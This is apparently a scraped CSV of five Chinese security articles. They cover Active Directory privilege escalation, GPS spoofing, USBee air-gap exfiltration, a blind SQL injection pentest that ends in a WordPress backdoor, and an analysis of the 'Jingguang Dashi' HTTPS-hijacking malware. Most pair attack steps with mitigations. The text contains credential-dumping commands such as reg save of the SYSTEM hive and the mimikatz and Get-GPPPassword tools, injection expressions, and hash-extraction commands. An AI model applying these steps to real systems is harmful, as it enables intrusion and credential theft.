"5ccbf9df4f2f0a0a7a69bfd5","现在攻击者有很多方法可以用来获取域管理员权限.这篇文章的目的是介绍一些当前较受欢迎的方式。这里所介绍的技术的基本点是攻击者已经拿到了一台域中的服务器，并已获得域用户凭据。","Blackhold","前言现在攻击者有很多方法可以用来获取域管理员权限.这篇文章的目的是介绍一些当前较受欢迎的方式。这里所介绍的技术的基本点是攻击者已经拿到了一台域中的服务器，并已获得域用户凭据。对大多数企业来说有一个不幸的现实:对于一个攻击者来说,从域用户权限提升到域管理员权限往往不需要太长的时间。为什么会这样呢?本文会介绍其中使用的一些技巧.现在针对一个企业,组织的攻击越来越频繁通过一些钓鱼手法来开始.比如通过发送大量的钓鱼邮件给目标的成员来在目标网络的机器上执行代码.一旦攻击者能够在企业内部网络中执行代码,攻击者要做的第一件事情就是尽可能的搜集有用的信息,比如网络拓扑,一些配置文件,账号密码等等,然后使用这些信息来提升权限,维持访问,最后当然是最重要的一步,获取目标的核心数据.虽然具体到每次的攻击可能其攻击的具体细节不同,但是他们一般都会有以下的几个大步骤:恶意代码执行(通过钓鱼, web方面的攻击等等)内网信息探测窃取内网用户的凭据利用各种信息,exploit等进行提权拿到数据并外传持久化(植入后门)本文所介绍的各种域渗透的技巧都是基于攻击者已经拿到了一台域内服务器的权限,这是因为在现代的网络环境下这一般都不是太困难.在域中获取域管理员权限的多种方法1.在SYSVOL和组策略首选项中保存的密码该方法是最简单的，因为不需要特别的“黑客”的工具。所有攻击者所要做的就是打开Windows资源管理器 然后 搜索域SYSVOL DFS共享的XML文件。大多数时候，下面的XML文件将包含凭据：groups.xml，scheduledtasks.xml，与services.xml。SYSVOL是域中针对所有已被认证过的具有读取权限的用户的共享。SYSVOL包含登录脚本，组策略的数据，以及其他需要被域控制器访问的数据。所有域组策略都存储在这里： \\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\当创建一个新的GPP时，有在SYSVOL中会创建一个相关联的XML文件 ,其内容为相关配置数据并且如果为GPP提供了密码，密码会被AES-256 加密.但是微软在MSDN上发布的AES加密密钥可用于解密它。又由于在受信任域中的任何域用户或用户都对SYSVOL具有读取访问权限，所以任何域中的用户都可以在SYSVOL共享搜索包含“cpassword”的XML文件.一个示例文件如下:攻击者在访问该XML文件后，可以使用AES私钥来解密文件中加密的GPP密码。除此之外,我们可以使用PowerSploit其中的一个功能 Get-GPPPassword来解密那个被加密的秘钥。下面是一个使用示例当然其他文件类型也可能会包含一些密码（通常是明文），如VBS和bat文件中,这就需要我们做好信息搜集了.你可能会认为只要打上一个防止管理员在Group Policy Preferences中放置凭证的补丁就能够解决这个问题，但我在对客户进行安全评估的时候依旧会在SYSVOL中搜索凭据。解决方案：在每台计算机上安装KB2962486补丁来管理管理GPO以防止在Group Policy Preferences中放置新的凭据删除现有的包含SYSVOL密码的GPP XML文件。不要将密码保存在所有经过验证的用户都可以访问的文件中。关于这种攻击的的更多信息可以在这篇文章中找到:  Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences.2.在没打补丁的域控制器上利用MS14-068漏洞虽然这个漏洞已经过了很久了,但是这并不意味着所有的域控制器都已经打上了补丁。大多数组织在该漏洞爆出来后都为域控制器打上了补丁但这并不意味着之后的每一台新的的域控制器也都被打上了补丁. 感谢Gavin Millard（@gmillard在Twitter上），我们有一个比较好的图来诠释这个漏洞简单地说，利用MS14-068漏洞,只需不到5分钟就能使攻击者重新写一个有效的Kerberos TGT身份验证票据，使他们可以直接获取域管理员权限。如上图所示，只要在一张普通的机票上写上“飞行员”,然后在登机，你就可以享受飞行员的待遇了......首次公布的针对MS14-068漏洞的exploit 在漏洞补丁被发布的第二个星期被发布.该exploit由Sylvain Monné (@BiDOrD) 编写,exploit的名字为PyKEK。PyKEK是一个可以运行在任何支持python并且能与域控制器交互的机器上的python脚本.脚本执行完毕后会生成一个ccache文件。然后使用Mimikatz把刚才PyKEK生成的ccache文件注入TGT到内存中,攻击者就可以拿到一个可以被当做域管理员的票据了！使用这张票据，攻击者就可以访问域控制器上的admin$ 共享了.下面是整个利用过程.缓解：打上补丁.利用MS14-068漏洞的过程：1.以标准用户申请一个没有PAC的Kerberos TGT身份验证票证，域控制器会返回一个无PAC的TGT.2.不使用key生成一个伪造的PAC，所以产生的PAC会使用当前域用户的密码数据来进行MD5而不是HMAC_MD5“签名”。3.发送 PAC-less TGT和伪造的PAC给域控制器，作为TGS服务票据请求的数据的一部分。4.之后域控制器会被这个迷惑，它会丢弃由用户发送的PAC-less TGT，并且创建一个新的TGT然后在它自己的授权数据中插入伪造的PAC ,接着发送该TGT给用户。5.这个拥有伪造PAC的TGT使用户对于一个有漏洞的DC而言成为了一个域管理员。Benjamin Delpy(Mimikatz的作者）写了一个MS14-068漏洞利用工具他的名称为Kekeo。这个工具的效果比pykek要好.下面是一个示范&gt;缓解措施：1.运行DCPromo进程前检测是否安装了KB3011780补丁.使用powershell快速检测:get-hotfix 30117802.此外，实施自动化的过程，确保强制安装严重漏洞的补丁3.离线破解 Kerberos TGS Service Ticket( Kerberoast)Kerberoast可以作为一种从Active Directory中以一个普通用户权限提取服务帐户凭据的有效的方法,而且不需要发送任何数据包到目标系统。因为人们往往会使用弱口令,因而这种攻击是有效的。Note:   使用这种方式,不需要提升权限,也不会向目标发送流量.针对这种攻击的详细情况:https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin%281%29.pdf工具：https://github.com/nidem/kerberoast缓解措施：1.域管理员的账号不能以任何形式在普通主机上登录.2.所以机器的本地管理员账号密码要复杂,随机.访问域数据库文件(NTDS.DIT)域数据库文件(NTDS.DIT)包含了域中所有对象的信息,其中我们最为关注的是其中还包含了所有用户的账号和密码的hash值.NTDS.DIT文件只有能登录到域控制器上的用户才有可能访问得到.显然保护该文件非常重要.下面是一些不需要域管理员权限来获取NTDS.DIT文件的方法.找NTDS.DIT文件备份位置在成员服务器上找NTDS.DIT文件拿到了虚拟机宿主机的权限,把虚拟机中的域控制器中的 NTDS.DIT拷贝出来域中有很多的组,其中能登录到域控制器的组有Enterprise Admins (member of the domain Administrators group in every domain in the forest)Domain Admins (member of the domain Administrators group)AdministratorsBackup OperatorsAccount OperatorsPrint Operators这意味着如果我们能拿到一个位于这些组中的用户的账号密码我们就可以登录到域控制器了.缓解措施：限制能登录到域控制器的用户和组限制拥有完全域权限的用户保护NTDS.DIT文件.当我们有了域管理员权限之后......当我们拿到域管理员权限后,要做的最重要的事就是 dump所有域用户的凭证.使用mimikatz dump所有域凭据mimikatz可以在域控制器上dump所有域凭据Dump LSASS memory with Mimikatz (拿到域管理员凭据)mimikatz可以被用来dump LSASS然后从LSASS.dmp 文件中导出所有已经登录了的账号密码.在域控制器中这通常会得到域管理员的凭据.使用ntdsutil拿到NTDS.dit文件从NTDS.dit文件中dump用户凭据一旦攻击者从注册表中拿到了 system hive(reg save hklm\system c:\system.hive)和NTDS.dit文件,就意味着他拿到了域中的所有凭据.","2016-11-24 00:34:14","系统安全","在域中获取域管理员权限的多种方法及一些缓解措施","http://nsoad.com/Article/system/20161124/839.html"
"5ccbf9df4f2f0a0a7a69bfd6","1月12日，就在奥巴马准备发表任上最后一次国情咨文演讲的前一小时，两艘载有10名海军的美国巡逻艇因驶入伊朗水域，被伊朗军方扣押，这一突发事件，给总统的上台演说增加了几分尴尬。第二天，船员们就被伊方","silence","1 事件1月12日，就在奥巴马准备发表任上最后一次国情咨文演讲的前一小时，两艘载有10名海军的美国巡逻艇因驶入伊朗水域，被伊朗军方扣押，这一突发事件，给总统的上台演说增加了几分尴尬。第二天，船员们就被伊方释放，但美方似乎没有官员能对偏离航向的原因做出合理解释。国防部长阿什顿卡特只是简单回应到：那些训练有素的船员“迷航”了，调查在进行中。图：伊朗媒体报道的美国巡逻艇大兵缴械投降画面2 猜想该事件虽然没有明确的解释，但不免让人们猜测，可能是伊朗向美方巡逻艇发出GPS欺骗攻击，诱使船只偏离航向。虽然美军军用GPS经过高度加密，常规上劫持GPS系统也非常困难，但对伊朗来说，曾有过先例：2011年，伊方曾声称通过GPS欺骗技术捕获了CIA的一架机密无人机，该无人机原计划在阿富汗降落。3 GPS欺骗技术的发展早在2008年，德克萨斯州立大学奥斯汀分校的Humphreys教授已经研发出了业内公认的GPS欺骗攻击系统（GPS spoofer），该spoofer针对导航系统发送虚假信号，几乎可以以假乱真。另外，康奈尔大学的Psiaki教授也在GPS信号探测和欺骗领域进行着深入研究。在伊朗捕获美国无人机事件不久，美国土安全部便决定对无人机GPS欺骗技术展开调查。2012年6月，Humphreys研究团队受DHS之邀在白沙导弹靶场进行无人直升机攻击测试（TED视频），最终，无人机被GPS欺骗系统成功诱骗。该测试攻击也受到国家立法层面和媒体的关注，后来，Humphreys还受邀出席了美国国会关于无人机安全的讨论。此后，虽然GPS欺骗攻击的严重性深入人心，但其对导航系统的威胁却鲜为人知。为了预防GPS欺骗，我们首先要了解对手如何破坏GPS信号。无人机捕获事件和攻击测试明显表明了GPS漏洞的存在，而GPS的其它应用更令人担忧，如：手机信号塔、证券交易所、电网等关键系统都部分或全部使用GPS精准定时。有针对性的GPS欺骗可导致通信中断、金融交易混乱、电力系统瘫痪等。可以相像，最严重的情况，GPS欺骗攻击者甚至可以操纵信号，让飞机或轮船发生相撞。4 GPS欺骗攻击测试实例-白玫瑰号游艇Andrew Schofield，白玫瑰号超级游艇船长，在2013年德州SXSW互动会议上听取了Humphreys关于白沙无人机攻击测试的案例细节后，主动邀请Humphreys对白玫瑰号游艇的GPS信号进行测试。Humphreys接受了这项邀请。白玫瑰号游艇主要依靠GPS来定位航行，通过GPS天线和接收器来接收卫星数据。Humphreys与研究团队携GPS欺骗系统登上了白玫瑰号游艇从摩纳哥到希腊罗德岛的旅程。就在行程的第二天，研究团队便成功利用虚假信号取代了GPS接收器的接收信号，实现了游艇的左向3度偏移。偏移十分轻微，最终，GPS欺骗攻击使白玫瑰号偏出预定航线一公里。5 GPS欺骗技术原理Humphreys团队是如何做到的？在通常的运行机制中，GPS接收器通过一次计算与多个卫星的距离来判断自身位置。每个卫星都配置有原子钟，并时刻向外广播其位置、时间和伪随机噪音码（由1023个正负号组成的签名模式, PRN码）。因为所有GPS卫星都使用相同的频率来广播民用信号，这些PRN码用来标识信号发射源，所以非常重要。PRN码的构成模式也随时重复变换，GPS信号接收器通过其正负号的独特排列方式，来判断和卫星之间的通信传输延迟。GPS信号接收器使用这些延迟，配合卫星方位和时间戳，精确测量出自身位置。虽然一个GPS接收器使用3颗卫星数据就能定位坐标，但为了得到更好更精确的修正位置，接收器必须同时接收四颗或更多的卫星信号。GPS网络由31颗卫星组成，并由美国空军操作控制。这些卫星广播民用和军用两种PRN码，其中，民用PRN码是不加密且在卫星数据库中公开的，而军用PRN码是被加密的，只有当GPS接收器具备其秘密密钥才可接收解码数据。通常来说，即使非军用GPS接收器接收了军用GPS信号，却无法使用这些信号来判断位置。另外，出于安全原因，美国空军频繁变换军用信号接收密钥，因此，只有那些拥有最新密钥的军用GPS接收器才能正常接收使用军用信号。 如果要攻击像白玫瑰游艇上的民用GPS信号接收器，GPS欺骗系统必须判断出在给定时间区域内攻击目标附近的轨道卫星，然后利用公开数据库中的公式，伪造不同卫星的PRN码信息，之后，欺骗系统在攻击目标附近，通过广播与卫星信号相同的PRN码值信息，欺骗攻击目标的GPS接收器注册接收这些虚假信号。有一种艺术性的攻击技巧“Drag-Off”，可以隐秘地覆盖掉真实的GPS信号。要做到这一点，在GPS接收器获取这些受骗信号之前，欺骗系统必须逐渐增加虚假信号功率。如果虚假信号频率增加得太快，也会引起怀疑。一旦GPS接收器锁定并接收了这些虚假错误信号，攻击者可以调整接收器，舍弃真实信号，更换成其它新的坐标集。6 GPS欺骗防御技术幸运的是，来自美国康奈尔大学的Psiaki教授和他的学生团队已经研发出反GPS欺骗的防御系统。事实上，Humphrey团队在白沙靶场进行无人机攻击测试的同时，Psiaki也在现场对一个早期的GPS防御模型进行测试，该模型经过数小时的离线计算可以成功检测每次GPS欺骗攻击。防止GPS欺骗攻击，有三种主要方式：加密、信号失真检测、波达方向（DOA）感应。单独一种方法不可能实现完全防御。加密：加密方式为使用者提供了空中认证信号。举个例子，就像民用GPS接收器获取了加密的军用PRN码后，将不能完全可知或解码，当然，GPS欺骗系统也不可能做到提前伪造合成加密信号。如果要认证每个信号，那么每台民用GPS接收器将要携带类似于军用接收器上的加密密钥，而且要保证攻击者不能轻易获取到这些密钥。 或者，接收器可以先接收信号中的不可预测或解码的那部分，之后，等待发送方广播有数字签名的加密密钥来验证信号源。然而，这种方式会产生短暂延迟，而且，还需要掌握GPS网络的美国空军修改信号广播方式，另外，民用接收器制造商也要重新改变设备构造。 当然，另外一种简单方法就是，在军用加密信号中“加载”民用信号。目前，军用信号即使无法被解码和用于导航，但已经可以被民用接收器接收，民用接收器通过观察接收到的PRN码噪音痕迹，能间接验证信号发射源。这种策略还需依赖另外一台安全的民用接收器，这台接收器用以区分验证多个信号的噪音痕迹，否则，攻击者一样可以制造虚假的痕迹。加密技术的缺点是，所有的加密方式都容易被专门的系统进行信号拦截、传输延迟、信号重放等攻击，这种专门的工具称为信号模拟干扰器Meacon，它可以使用多种天线来模拟不同距离的信号延迟，通过调整延迟距离，攻击者可以轻易欺骗任何GPS接收器。信号失真检测：另一种防御GPS欺骗的方法是信号失真检测，当GPS信号正在被欺骗攻击时，这种方法可以根据一个短暂可观测的峰值信号来警告用户。通常，GPS接收器会使用不同策略来追踪接入信号的振幅强度，当一个模拟信号被传输发送时，接收器上显示的是原始信号和假信号的合成，而这种合成将会在Drag-off期间的振幅中出现一个峰值信号。波达方向感应：Psiaki在白沙靶场演示的欺骗探测防御系统就是使用这种技术，该系统主要技术点在于，它需要几个小时的脱机数据处理计算来检测欺骗攻击。FB百科：波达方向（Direction Of Arrival）估计，又称为谱估计（spectral estimation）、波达角（Angle Of Arrival）估计。一个信源有很多可能的传播路径和到达角。如果几个发射器同时工作，每个信源在接收器处形成潜在的多径分量角度。因此，接收天线能估计出这些到达角就显得很重要，目的是估计出哪个发射器在工作以及发射器所处的方向。由于真实的GPS信号来自于多颗卫星，因此在GPS接收器附近会形成多种角度。而在真实的GPS欺骗攻击场景中，同一时间只能在一个地方，通过伪造GPS接收器附近卫星的PRN码来制造虚假信号，并且，这些不同的信号将会从一个天线进行传播扩散，它们到达GPS接收器附近时，产生的是同一个方向的角度。所以，波达方向感应正是利用了这样一种事实和原理，如果GPS接收器附近的同一方向，产生了不同的信号，那么，GPS欺骗攻击可能正在进行。当然，如果能分别感应到每个信号的到达方向，就可轻易确定是否正遭受GPS欺骗。为了验证这个想法，最近，Psiaki的实验室利用干涉检测原理，构建了一种使用软件和两个天线的GPS欺骗发现系统。具体来说，它使用载波相位作为检测属性，分辨信号在不同天线之间的变化区别，来确定信号的到达角度（方向）。载波相位是指在信号接收时刻，卫星信号的相位相对于接收器产生的载波信号相位的测量值。载波相位检测是计算GPS信号多普勒频移周期的方法。多普勒频移发生于信号发射器与接收器有相对移动时。一个经典的例子就是：当消防车经过并远离你时，警笛声音的频移从高到低。 GPS卫星与GPS接收器之间会产生相对运动，并且这种相对运动对每个卫星都不同。7 GPS欺骗攻击检测防御实例-白玫瑰号游艇在Schofield的要求下，Psiaki团队在2014年6月白玫瑰号巡游意大利时测试了这个检测防御系统。欺骗攻击由Humphreys团队策划，使船偏离行驶在前往利比亚的航道上。Psiaki的GPS欺骗检测器通过测量来自多个卫星和欺骗系统的7个GPS信号载波相位，在攻击一开始，就向船员发出了欺骗发现警告。当攻击开始后，欺骗检测器发现，不同的变化在真正的载波相位差中消失了。至利比亚航道的Drag-off欺骗，在开始后约125秒进入攻击，而Psiaki的检测系统在其中首个循环检测的第6秒内就捕获到了攻击。8 几种欺骗防御技术比较今年初，GPS制造商U-blox在其M8系列的商用导航系统中通过更新固件内置了欺骗防御装置。该公司没有公布欺骗检测的方法，但估计可能是信号失真检测，因为这种方法最容易固件更新来实现。但是，基于失真检测的方法可能在攻击早期不能及时捕获欺骗，相对来说，加密方法是非常有效的（当然这得详细咨询美国空军），但这需要GPS信号广播方式在物理构造上做出改变，当然，或许还需要高带宽通信链路。目前，欧洲伽利略导航卫星系统的设计师们已经认可并测试了这种方法，但是，这样的加密信号系统仍然易受信号干扰攻击。另外，波达方向感应比失真检测成本更昂贵，因为它需要多个大型天线设备。而且，有些攻击仍可以欺骗它：如果欺骗攻击系统的目标只接收一到两个GPS信号，而不是附近范围内所有卫星信号，那么，在欺骗防御系统关闭后，有些载波相位差甚至在攻击后仍然存在。9 结语最终，我们认为信号失真检测和波达方向感应的综合可能是最好的欺骗防御方法。失真检测应用于攻击初始阶段，而波达方向感应则提供第二道阶段防御。但是，这样的综合解决方案对大多数普通用户来说，稍显昂贵，而且，一般用户并不需要欺骗防御系统。当然，希望这是个安全的赌注，当美国驾驶员开车寻找时髦餐馆或载小孩去看棒球比赛时，也许伊朗特工对这种GPS欺骗根本不感兴趣。以上研究仅仅是信息物理网络安全（CPS）的一小部分。想像一下，在拥挤的高速公路上，黑客能做到发送虚假雷达信号到高档汽车的自动剎车系统，让它来个急刹车吗？答案是肯定的，令人惶恐的。在信息安全测试研究中，红队实施系统攻击，而蓝队负责防御侦察，这种测试方法对我们的工作非常有用，在某些方面来说，我们亟需加强防御能力建设。Humphreys 目前还在德州大学奥斯汀分校担任航天工程和工程力学系副教授。联邦调查局特工曾多次参观了他的实验室，并向他咨询有关GPS欺骗攻击的事。*本文编译来源：spectrum.ieee，编译","2016-09-13 20:46:28","无线安全","详解GPS欺骗：针对导航系统的「致命攻击」","http://nsoad.com/Article/wifi/20160913/392.html"
"5ccbf9df4f2f0a0a7a69bfd7","有一位名叫Mordechai Guri的以色列研究员，善于利用一些特别的技巧从未联网的电脑中提取信息。他和他的团队曾在今年6月通过计算机风扇的噪声，成功获取到离线计算机中的数据。而这一次，他又成功利用了射频","blackhold","有一位名叫Mordechai Guri的以色列研究员，善于利用一些特别的技巧从未联网的电脑中提取信息。他和他的团队曾在今年6月通过计算机风扇的噪声，成功获取到离线计算机中的数据。而这一次，他又成功利用了射频传输技术，通过USB 2.0接口，实现了从离线PC上获取数据信息。这种新技术名叫USBee。其工作原理是首先将装有攻击软件的USB设备插入PC中，植入恶意软件；之后将USB接口当成RF射频发射器来用：具体方法是调制发往USB设备的高速数据流，这样就可以直接利用USB本身向外发射无线电信号了。传输信息的逻辑并不复杂，比如240MHz-480MHz区间内的电压辐射用来表示“0”——这样就能够按照所发出的不同的频率组合以0101的方式把数据传输出来。外部接应的接收器可以通过接收到的信号频率变化，还原出相对应的数据信息。具体实施中，若要传出密码或者加密密钥，可以利用二进制移频键控（B-FSK）将二进制数据信息调制成波。通过接口数据针脚的快速电压变化就能形成相应的载波。据Guri的估算，USBee的无线发出速度（80比特/秒）足以在十秒内发送一个4,096位的加密密钥到附近的接收机。可以使用以下函数创建基本载波：inline static void fill_buffer_freq(u32 *buf, int size, double freq){  inti = 0;  u32x = 0; double t = freq / 4800 * 2;  for(i = 0, x = 0x00000000; i之后，只要用户有“写文件”的权限，就能够将结果Buffer写入移动设备中，来生成发射信号。Guri和他的团队在这周刚发出的研究报告中称：“实际的数据传输过程是：函数fill_buffer_freq()将接收到的buffer生成byte pattern，再写入USB的任意数据模块和数据流中”。“这个传输过程不需要很高的权限，只要可以在移动设备上创建文件夹即可。”视频中，Guri的团队展示了如何利用一台笔记本电脑，再加上30美元的无线电天线，在距离15英尺远的地方就能接收到数据。这次实验说明这种全新的USBee技术可以用来实施暗中监视。无论是在酒店的隔壁房间，还是拥挤的办公室。这是一次有趣又实用的入侵行为。当然，想要完成这次入侵，首先要让恶意软件能够接触到未联网的电脑，即将安装了恶意软件的USB插入PC；同时，还需要在没有人注意的情况下离这台PC足够近，才能够接收到有效信号。总之，只要你贿赂对了人，威胁了合适的人，准确利用了安全平台（OPSEC）的漏洞，那么将目标代码编入到目标机器也不是不可能的。* 参考来源：TheRegister，本文由孙毛毛编译，转载请注明来自FreeBuf（Freebuf.COM）","2016-09-18 11:41:11","无线安全","如何从未联网PC中获取信息？试试让USB接口变身无线电发射器","http://nsoad.com/Article/wifi/20160918/411.html"
"5ccbf9df4f2f0a0a7a69bfd8","我们从相对简单的 SQL 盲注入手，展现其如何被利用到可以执行远程代码。在测试的过程中会用到 Dunacn.","Avenger","介绍很多人说 Web 应用渗透测试是一个应用已有工具和方法的已知区域，但其实每个项目都会遇到一些新的技术和令人感兴趣的新场景，这些挑战令人兴奋。我们从相对简单的 SQL 盲注入手，展现其如何被利用到可以执行远程代码。我们在测试的过程中会用到 Dunacn，这是我们用来辅助 SQL 盲注利用的简单框架。SQL盲注最初的漏洞存在于应用编辑器，提交的参数之一只是简单的连接成了 SQL 查询语句，而没有进行检查和过滤。但是我不能通过应用程序的响应或错误信息来得到注入的结果。因此，这是一个简单的盲注场景，但是对于从数据库中提取想要的数据仍然不容易。为了简单起见我使用了 SQLmap，但是我无法得到工具可识别的注射参数。像往常一样，我还是使用了 Duncan，Duncan 可以提取像这样场景下的数据。我创建了一个简单的模块，使用下列表达式来执行请求（后端使用的数据库是 PostgreSQL）：""ascii(substr(cast((%s) as varchar),%d,1))&lt;%d""Duncan 会用可执行的请求参数来代替第一个占位符（%s），第二个占位符指明了我要猜测的字符位置，第三个占位符是猜测的字符值。Duncan 会开始执行多线程的请求来检索注入请求的结果。在映射数据库结构后，我就有希望快速得到能登录应用管理交互界面的密码。$ wc -l mytarget.py # Including blank lines, imports, and everything...22 mytarget.py$ python run_duncan.py --use mytarget.SimpleDuncan --query ""select password from users where id=1"" --pos-end 33 --threads 5 --charset 0123456789abcdefdeadbeefdeadbabedeadbea7deadc0de为了提高效率，我使用自定义的字符集，并且基于之前测试的结果设置了最大长度，看起来该应用程序以十六进制存储了密码的 MD5 哈希值。我成功的得到了一些重要用户的密码哈希值，我也得到了我自己的哈希值以便进行验证。我尝试了帐号、密码、相关信息的多种组合，但是这都和数据库中存储的不一致。深入研究很明显，在密码的哈希过程中有“盐”的参与，但我不知道“盐”是什么。有可能是前缀形式、后缀形式或者级联哈希构造（如 MD5(MD5(password)||salt)）等，但是没办法猜出它使用的是哪种方法。幸运的是，我记起我看过的一篇文章，讲的是如何使用数据库的元数据来 SELECT 当前执行的请求，他称之为 SQL inception。如果哈希的计算在数据库中而不是在应用程序中计算，这就是一个机会，我可以捕捉设置哈希过的密码的请求，从而了解哈希值是如何生成的。首先，我必须要找出我注入了什么。尽管我猜测我使用 UPDATE 指令 修改了用户表，但有些其他请求被我的注入破坏也是有可能的，那么在这种情况下这个方法就是不切实际的。幸运的是我是正确的，看起来我确实成功注入了 UPDATE 指令：注：事实上，我可以利用并行执行来检索 UPDATE，但是我选择了用另一个请求注入，虽然这样的利用过程变得效率更低。$ python run_duncan.py --user mytarget.SimpleDuncan --query ""select upper(query) from pg_stat_activity"" --pos-end 6 ascii-end 97 UPDAT我试图找到设置密码的那部分请求，但有趣的是我得到了完全不可信的结果。几经测试后，我决定找出更多关于 pg_stat_activity 表的信息：$ python run_duncan.py --user mytarget.SimpleDuncan --query ""select cast(count(*) as varchar) from pg_stat_activity"" --pos-end 4 --charset 012345678935似乎其他人也在使用数据库，最初的请求得到了错误的数据。为了解决这个问题，我使用 WHERE 来限制我请求得到的结果：$ python run_duncan.py --user mytarget.SimpleDuncan --query ""select cast(strpos(upper(query),'MD5') as varchar) from pg_stat_activity WHERE query like '%S2S2S2%'"" --pos-end 4 --charset 0123456789156由于 WHERE 子句将会被包含在 ps_stat_activity 表的查询属性中，它保证了查询请求可以包含它本身。找到调用 MD5 函数的位置我就可以查看参数了：$ python run_duncan.py --user mytarget.SimpleDuncan --query ""select upper(query) from pg_stat_activity WHERE query like '%S2S2S2%'"" --pos-end 4 --ascii-end 97 --pos-start 150 --pos-end 180 --threads 10ORD = MD5('MYPASS#SOMESALT#'清楚了哈希值是如何构建的，我就可以在基于 GPU 的破解器中加载之前收集的管理员哈希。oclHashcat 在破解 MD5 时的表现很好，大部分的密码都可以通过暴力破解得到，特别是在“盐”不变的情况下。现在我可以使用破解后的密码，加上用 WPScan 枚举的用户名可以登录一个 WordPress 博客的管理面板。在 WordPress 的管理页面，我以 PHP 模版的名义上传了一个后门程序，此时我就可以以服务器高级权限来执行远程代码了。结论在这篇文章中，我展示了 SQL inception 这项技术应用到渗透测试中如何解决实际问题，以及如何根据 Duncan 的结果进行微调来得到最佳结果。我们也想强调密码的管理和存储仍然是简单 Web 应用和复杂企业系统的主要弱点。我们给开发者和管理员的建议：使用参数化请求或 ORM 用于数据库访问，已经到了 2015 年，你不应该再使用手工拼接的 SQL 请求了！使用现代密码扩展算法用于密码存储，Bcrypt、PBKDF2、Scrypt 和 yescrypt 都各有优势，从实际情况来看，这些设计都能显著的提高攻击者破解的难度。MD5 和 SHA-* 的设计都不是适合密码存储而是标定指纹。使用尽量长的、独特的“盐”，前面提到的大多数算法都允许你自己定制“盐”你系统的安全性不应该依赖于“盐”或所使用算法的保密性使用离线的密码管理器，不同的系统永远不要使用相同的密码如果不得不将密码记在心里，使用长密码短语来代替传统的密码。教你的用户用相同的方式来贯彻落实密码策略，而不是用长密码来代替复杂的密码。","2017-01-11 12:05:18","Web安全","如何找到SQL注入中的盐","http://nsoad.com/Article/web/20170111/1011.html"
"5ccbf9df4f2f0a0a7a69bfd9","近期，火绒团队截获一个由商业软件携带的病毒，并以其载体命名为“净广大师”病毒。","kong","一、背景近期，火绒团队截获一个由商业软件携带的病毒，并以其载体命名为“净广大师”病毒。在目前广为流行的“流量劫持”类病毒中，该病毒策略高明、技术暴力，并攻破HTTPS的“金钟罩”，让百度等互联网厂商普遍使用的反劫持技术面临严峻挑战。且该病毒驱动在”净广大师“卸载后仍然会持续加载并劫持百度搜索流量，行为及其恶劣。我们曾在此前报告（“净广大师”病毒攻破 HTTPS防线 劫持百度搜索流量牟利）中进行过病毒简述，本文中我们将对“净广大师”病毒进行详细分析。二、 样本分析在“净广大师”安装过程中，我们注意到“AdAnti.exe”进程在系统驱动目录下释放了一个隐藏的文件名为“rtdxftex.sys”的驱动。如下图所示：图2-1、“净广大师”安装过程    该驱动是“AdAnti.exe”从“净广大师”安装目录下复制到系统驱动目录的，该驱动有32位和64位两个版本，文中主要依据32位版本的病毒驱动（TdxFlt_i386.sys）进行分析。如下图所示：图2-2、病毒驱动文件    在病毒驱动加载后，通过提取内存字符串，我们获得到了更多与病毒相关的特征信息，而且这些特征在静态状态下是无法在病毒驱动文件中提取到的。如下图所示：图2-3、病毒驱动加载后的内存数据    通过我们对该病毒驱动的分析，我们发现该驱动运行会先执行两次解密操作，第一个解密后获得驱动运行时所需的数据，第二个解密操作可以得到一个病毒动态库。解密代码如下图所示：    图2-4、病毒解密代码    根据其代码中的解密算法还原，我们可以解密出该驱动使用的一个病毒动态库和在其内部使用的一些关键的数据，如下图所示：    图2-5、病毒动态库解密    图2-6、病毒数据解密    通过对病毒驱动的分析，我们发现病毒会将其解密后的动态库通过APC注入的方式注入到“explorer.exe”进程中。如下图所示：图2-7、病毒注入“explorer.exe”代码    图2-8、APC注入代码（1）    图2-9、APC注入代码（2）    在病毒注入“explorer.exe”之后，百度的搜索链接便会被劫持带上病毒制造者的计费ID。在我们重现的环境中，该病毒劫持到的计费ID为“93718154_hao_pg”。如下图所示：图2-10、百度被病毒劫持    通过分析得知，该病毒是通过代理的方式，以中间人攻击的形式来劫持HTTPS流量。如下图所示，病毒驱动注入到explorer.exe进程的代码会监听10100端口。图2-11、注入后explorer的病毒代码劫持IE的联网请求    当浏览器访问百度时，病毒驱动会将连向百度（61.135.169.125）443端口（HTTPS）的链接重定向到本地的10100监听端口，explorer中的病毒代码再代替浏览器发起与远端Web服务器的链接进行通讯。该病毒同时通过自己携带的证书分别与浏览器和远端Web服务器完成SSL握手，进而以中间人攻击的形式完全控制HTTPS链路通信。     通过对该病毒注入explorer的动态库进行分析，发现在该动态库资源中，我们可以看到病毒”劫持”所用到的SSL证书。如下图所示：    图2-13、病毒发起劫持所用到的SSL证书    在病毒将该动态库注入explorer后，我们在explorer.exe进程的内存块中也同样可以提取到与上图相同的证书数据。    图2-14、explorer.exe进程内存字符串     在将上述内存中的证书数据保存为证书文件后，将其与病毒劫持证书进行对比，两者的根证书与子证书完全一致。如下图所示：    图2-15、静态解码的劫持证书（左为根证书、右为子证书）     图2-16、被劫持现场中显示的劫持证书（中为根证书、右为子证书）    三、 同源性分析通过在火绒样本管理平台中搜索“净广大师”病毒使用的百度计费ID“93718154_hao_pg”，我们得到了少量关联样本。如图所示：图3-1、部分样本sha1图3-2、带有推广号“93718154_hao_pg”的病毒样本通过分析，我们发现这些样本与之前截获的“净广大师“病毒样本具有极高的同源性，且火绒已全部检出。同时，我们也从VirusTotal上查到友商对该病毒的检出结果。如图所示：图3-3、友商对“净广大师”病毒同源样本检出结果随后，我们有提取了这些病毒代码中的部分关键数据，在火绒样本管理平台中通过关联查询得到了更多的同源性样本。我们随即将这些病毒样本按捕获的时间进行了排序对比，如下图所示：图3-4、该病毒家族以往样本数据通过上图我们可以看出，无论是病毒的数据特征，还是病毒工程的编译路径都显示该家族的所有病毒样本与“净广大师“病毒一样，都出自同一个人。根据我们收集到样本时间来看，近段时间以来该病毒正在不断地进行迭代更新。从最早期样本运行时会产生日志，再到后来使用多个推广计费号劫持百度搜索，到最后现在版本将病毒数据和病毒动态库以加密方式存放在驱动镜像中。随着病毒的不断迭代，病毒的复杂程度正在不断提升。四、 附录文中涉及样本SHA1： 文件名      SHA1  AdAnti.exe      e06f337bd7512d5f278c8d064356f480b943bd19  TdxFlt_i386.sys      